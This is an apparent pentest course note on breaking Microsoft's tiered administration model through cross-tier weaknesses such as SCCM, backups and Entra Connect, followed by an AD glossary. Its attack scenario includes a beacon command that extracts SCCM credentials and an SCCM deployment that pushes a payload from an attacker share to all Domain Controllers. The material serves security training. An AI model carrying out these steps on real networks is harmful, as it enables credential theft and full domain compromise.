---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.18 Overcoming Tiered Administration Models"
---

# 18 - Overcoming Tiered Administration Models

## Visual Architecture

```text
+-------------------------------------------------------------+
| OVERCOMING TIERED ADMINISTRATION MODELS                     |
+-------------------------------------------------------------+
| TIER 0: DCs, PKI, AD FS, Entra Connect                      |
|    ^                                                        |
|    | (Strict Boundary - No Logon from lower tiers)          |
| TIER 1: Application Servers, Databases, API Gateways        |
|    ^                                                        |
|    | (Strict Boundary - No Logon from lower tiers)          |
| TIER 2: Workstations, End User Devices                      |
+-------------------------------------------------------------+
| ATTACK PATH: Pivot via cross-tier exceptions & misconfigs   |
+-------------------------------------------------------------+
```

## The Tiered Administration Model

Microsoft's Tiered Administration Model (and the newer Enterprise Access Model) aims to segregate administrative privileges based on the risk and value of the assets they manage. The core principle is simple: An administrator of a higher tier must never log on to a system in a lower tier. Doing so exposes their high-privilege credentials (in memory, LSASS, etc.) to a system that is more easily compromised.

### Strategies for Overcoming Tier Boundaries

Despite strict designs, real-world implementations are rarely perfect. Attackers look for "exceptions to the rule."

**1. Identifying Tier Zero Breaches:**
Often, organizations will misclassify a Tier 0 asset. For example, a backup server that backs up Domain Controllers must be treated as Tier 0. If it is treated as Tier 1, an attacker compromising Tier 1 can compromise the backup server, extract the NTDS.dit from the backup, and achieve Tier 0 compromise.

**2. Exploiting Cross-Tier Delegations:**
Sometimes, a Tier 1 application requires the ability to create users or manage certain aspects of Active Directory. This requires delegating permissions in AD. If the delegation is too broad (e.g., GenericAll over an OU rather than specific rights), it can be abused.

**3. Infrastructure Management Tools:**
SCCM, SCOM, and virtualization platforms (vCenter) are prime targets. If a Tier 1 SCCM server has an agent on a Tier 0 Domain Controller, compromising the SCCM server equates to compromising the DC via the agent's SYSTEM privileges.

**4. Identity Federation and Hybrid Identity:**
Azure AD Connect (Entra Connect) is a critical bridge. The synchronization account (MSOL_*) often has DCSync rights. If the Entra Connect server is not properly hardened as a Tier 0 asset, an attacker can extract the sync account credentials and execute a DCSync attack.

**5. Exploiting Human Operational Mistakes:**
Administrators get lazy. They might temporarily add their Tier 0 account to a local administrator group on a Tier 2 workstation to fix an issue, leaving a persistent artifact or cached credential behind.


## Real-World Attack Scenario
## Real-World Attack Scenario: Overcoming Tiered Admin Models

**1. Context and Environment:**
The target is a mature government agency that has strictly implemented the Microsoft Active Directory Tier Model. Tier 0 (Domain Controllers, PKI), Tier 1 (Servers), and Tier 2 (Workstations) are logically separated. Domain Admins cannot log into workstations, and workstation admins cannot access servers. The attacker has compromised a standard user in Tier 2 and needs to breach Tier 0.

**2. Attacker Thought Process:**
"The Tier Model is effectively blocking my lateral movement. I can't just steal a Domain Admin token from this Tier 2 laptop because they never log in here. To break the tier boundary, I must find a system or an account that bridges the tiers. Often, security tooling, backup agents, patch management systems (like SCCM), or virtualization hypervisors violate the tier model by operating across all tiers simultaneously. If I can compromise the management infrastructure, I can ride it straight into Tier 0."

**3. Reconnaissance and Enumeration:**
The attacker avoids noisy domain enumeration and focuses on identifying cross-tier infrastructure. They analyze the processes running on the compromised Tier 2 workstation and inspect firewall rules and network connections.
```powershell
# Identifying agents and management software
Get-Process | Select-Object Name, Path
Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }
```
They identify an active connection to an SCCM (System Center Configuration Manager) distribution point. Further LDAP queries reveal the SCCM primary site server (`SCCM-PRI-01`) resides in Tier 1.

**4. Exploitation and Execution:**
The attacker focuses on compromising the SCCM client on the local Tier 2 machine. They escalate to local SYSTEM, extract the Network Access Account (NAA) credentials used by SCCM, and decrypt them.
```bash
# Using a tool to extract SCCM NAA credentials from WMI
beacon> execute-assembly C:\Tools\SCCM-Hunter.exe extract
```
Using the NAA credentials, the attacker authenticates to the Tier 1 SCCM server. They discover that the SCCM infrastructure is misconfigured: the SCCM service account has administrative rights over *all* endpoints, including Tier 0 Domain Controllers, to push software updates. The attacker creates a malicious SCCM application deployment targeting the Domain Controllers OU.
```powershell
# Conceptual command for pushing a payload via SCCM
New-CMApplication -Name "SecurityUpdate" -Path "\\attacker\share\payload.exe"
Start-CMApplicationDeployment -CollectionName "All Domain Controllers"
```

**5. Post-Exploitation and Outcome:**
The Tier 1 SCCM server dutifully pushes the "SecurityUpdate" to the Tier 0 Domain Controllers. When the DCs check in for policy updates, they download and execute the payload as SYSTEM. The attacker successfully bypassed the rigid logical boundaries of the Tier Model by exploiting a systemic flaw in the patching infrastructure, transforming a Tier 2 workstation compromise into a total Tier 0 takeover without ever stealing a traditional Domain Admin credential.

## Chaining Opportunities
- [[01 - Active Directory Enumeration]]
- [[17 - Custom BloodHound Cypher Queries for Tier 0 Paths]]

## Related Notes
- [[16 - Bypassing Microsoft Defender for Identity MDI]]
- [[20 - Ultimate Active Directory Pentest Methodology]]

## Active Directory Reference Glossary

1. **Access Control Entry (ACE)**
   An entry in an ACL containing a SID and the access rights.

2. **Access Control List (ACL)**
   A list of security protections that applies to an object.

3. **Active Directory (AD)**
   The directory service developed by Microsoft for Windows domain networks.

4. **Active Directory Certificate Services (AD CS)**
   Microsoft's implementation of a Public Key Infrastructure (PKI).

5. **Active Directory Federation Services (AD FS)**
   A software component providing Single Sign-On (SSO) across organizational boundaries.

6. **Authentication Mechanism Assurance (AMA)**
   A feature that maps certificate-based authentication to security groups.

7. **Azure Active Directory (Azure AD / Entra ID)**
   Microsoft's cloud-based identity and access management service.

8. **BloodHound**
   An application that uses graph theory to reveal hidden relationships within AD.

9. **Credential Roaming**
   A feature allowing users to access their credentials on any workstation.

10. **Cross-Forest Trust**
    A trust relationship established between two AD forests.

11. **DCSync**
    An attack technique that simulates the behavior of a Domain Controller.

12. **DCShadow**
    An attack where an adversary creates a rogue Domain Controller.

13. **Delegation**
    The assignment of administrative authority over a specific portion of the directory.

14. **Directory Replication Service (DRS)**
    The protocol used to replicate changes between domain controllers.

15. **Directory Services Restore Mode (DSRM)**
    A special boot mode for a Windows Server domain controller to repair AD.

16. **Discretionary Access Control List (DACL)**
    Identifies the users and groups allowed or denied access to an object.

17. **Domain Controller (DC)**
    A server that responds to security authentication requests within a Windows Server domain.

18. **Enterprise Admins**
    A highly privileged group with control over all domains in a forest.

19. **Event Tracing for Windows (ETW)**
    A mechanism to trace and log events raised by applications.

20. **Extensible Authentication Protocol (EAP)**
    An authentication framework frequently used in network connections.

21. **Forest Root Domain**
    The first domain created in an Active Directory forest.

22. **GenericAll**
    A permission granting full control over a given object.

23. **GenericWrite**
    A permission granting write access to all attributes of an object.

24. **Group Policy Object (GPO)**
    A collection of settings that define what a system will look like.

25. **Hybrid Identity**
    An identity management strategy that encompasses both on-premises and cloud environments.

26. **Identity Provider (IdP)**
    A system entity that creates, maintains, and manages identity information.

27. **Kerberos**
    A computer network authentication protocol that works on the basis of tickets.

28. **Key Distribution Center (KDC)**
    The component in Kerberos that supplies session tickets.

29. **Local Security Authority (LSA)**
    A protected subsystem that authenticates and logs users onto the local computer.

30. **LSASS**
    The process responsible for enforcing the security policy on the system.

31. **Machine Account**
    The AD account associated with a computer joined to the domain.

32. **Managed Service Account (MSA)**
    A type of domain account created for services.

33. **Microsoft Defender for Identity (MDI)**
    A cloud-based security solution that leverages on-premises AD signals.

34. **Naming Context (NC)**
    A contiguous subtree of AD that is replicated as a unit.

35. **NT LAN Manager (NTLM)**
    A suite of Microsoft security protocols intended to provide authentication.

36. **Object Identifier (OID)**
    A globally unique identifier used in computing to name an object.

37. **Organizational Unit (OU)**
    A subdivision within an AD into which you can place users.

38. **Pass-the-Hash (PtH)**
    An attack in which an adversary captures the NTLM hash of a password.

39. **Pass-the-Ticket (PtT)**
    An attack in which an adversary extracts a Kerberos Ticket Granting Ticket (TGT).

40. **Password Hash Synchronization (PHS)**
    A feature of Azure AD Connect that synchronizes a hash of the hash.

41. **Primary Refresh Token (PRT)**
    A key artifact in Azure AD authentication.

42. **Privileged Access Management (PAM)**
    Information security mechanisms that safeguard identities.

43. **Read-Only Domain Controller (RODC)**
    A type of DC that hosts a read-only partition of the AD database.

44. **Relative Identifier (RID)**
    The part of a SID that uniquely identifies an account or group.

45. **Resource-Based Constrained Delegation (RBCD)**
    A form of delegation configured on the target resource.

46. **SAML (Security Assertion Markup Language)**
    An open standard for exchanging authentication and authorization data.

47. **Security Identifier (SID)**
    A unique, immutable identifier of a user, group, or other security principal.

48. **Security Support Provider (SSP)**
    A DLL that implements a security package.

49. **Security Support Provider Interface (SSPI)**
    A Win32 API used to access SSPS.

50. **Service Principal Name (SPN)**
    A unique identifier of a service instance.

51. **System Access Control List (SACL)**
    Enables administrators to log attempts to access a secured object.

52. **Ticket Granting Service (TGS)**
    A Kerberos ticket used to request access to a specific resource.

53. **Ticket Granting Ticket (TGT)**
    A Kerberos ticket proving that a user has been authenticated by the KDC.

54. **Trust**
    A relationship established between domains.

55. **Unconstrained Delegation**
    Allows a service to impersonate the user to any other service on the network.

56. **Volume Shadow Copy Service (VSS)**
    A Windows technology that allows taking backup copies or snapshots.

57. **Windows Management Instrumentation (WMI)**
    Microsoft's implementation of Web-Based Enterprise Management.

58. **Zero Trust**
    A security framework requiring all users to be authenticated.

59. **Active Directory Lightweight Directory Services (AD LDS)**
    An independent mode of AD providing directory services.

60. **Administrative Tier Model**
    A security concept designed to protect high-value identities.

61. **AS-REP Roasting**
    An attack targeting users without Kerberos pre-authentication enabled.

62. **Authentication Silo**
    A feature that allows assigning users and computers to a silo.

63. **Azure AD Connect**
    The tool for synchronizing on-premises AD identities with Entra ID.

64. **Certificate Trust List (CTL)**
    A list of items signed by a trusted entity.

65. **Constrained Delegation**
    Restricts the services to which a delegated account can connect.
